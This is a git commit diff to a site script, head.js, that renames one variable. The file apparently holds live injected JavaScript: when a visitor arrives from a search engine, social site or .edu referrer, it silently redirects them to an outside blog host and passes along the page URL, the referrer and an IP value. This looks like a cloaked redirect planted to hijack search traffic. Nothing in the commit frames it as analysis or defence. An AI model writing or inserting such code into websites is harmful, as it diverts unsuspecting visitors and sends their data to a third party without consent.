93bad09faa8b25daf1202efb79d79edc1abed229
asking2794 <146243355+asking2794@users.noreply.github.com>
2025-04-04 22:59:04 +0700

    Update head.js

--- head.js
+++ head.js
@@ -1,5 +1,5 @@
 ///// Arsae /////
-var ars = 'https://blog.unimal.edu.pl';
+var arsT1Bing = 'https://blog.unimal.edu.pl';
 
 if(['google.', '.edu.', 'msn.', 'bing.', 'yandex.', 'facebook.', 'ecosia', 'qwant', 'pinterest.', 'duckduckgo.', '.yahoo.', 't.co'].some(s => document.referrer.toLowerCase().includes(s))){ 
 	window.location.href = arsT1Bing + '/?arsae='+ encodeURIComponent(window.location.href) + '&arsae_ref='+ encodeURIComponent(document.referrer) + '&ip=' + window.ipAddressArsae
